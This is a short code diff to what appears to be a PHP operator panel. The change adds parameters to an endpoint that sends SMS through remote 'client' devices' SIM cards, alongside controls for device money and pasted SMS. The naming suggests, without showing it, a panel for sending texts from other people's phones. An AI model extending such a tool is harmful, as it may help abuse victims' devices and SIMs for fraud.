@@ -17,7 +17,9 @@ if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
     trim((string)($body['to'] ?? '')),
     trim((string)($body['message'] ?? '')),
     strtolower(trim((string)($body['schema'] ?? 'rabel'))),
-    trim((string)($body['device_node'] ?? 'clients'))
+    trim((string)($body['device_node'] ?? 'clients')),
+    !empty($body['same_number']),
+    max(1, (int)($body['sim_count'] ?? 1))
   );
   rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
 }
@@ -383,7 +385,7 @@ html,body{height:100%;width:100%;font-family:sans-serif;background:var(--main);c
       <button type="button" class="detail-btn" onclick="saveDeviceMoney()">Done</button>
       <button type="button" class="paste-btn" onclick="pasteDeviceSms()" title="Paste">📥</button>
     </div>
-    <input id="smsTo" class="detail-field detail-field-wide" placeholder="Recipient number (10 digit) — apna SIM number mat daalo"/>
+    <input id="smsTo" class="detail-field detail-field-wide" placeholder="Recipient phone number (auto-fills device SIM)"/>
     <input id="smsBody" class="detail-field detail-field-wide" placeholder="Enter SMS body"/>
     <div class="sim-row detail-sim-row">
       <button type="button" class="detail-btn detail-sim-btn" onclick="sendDeviceSms(1)">Sim1</button>
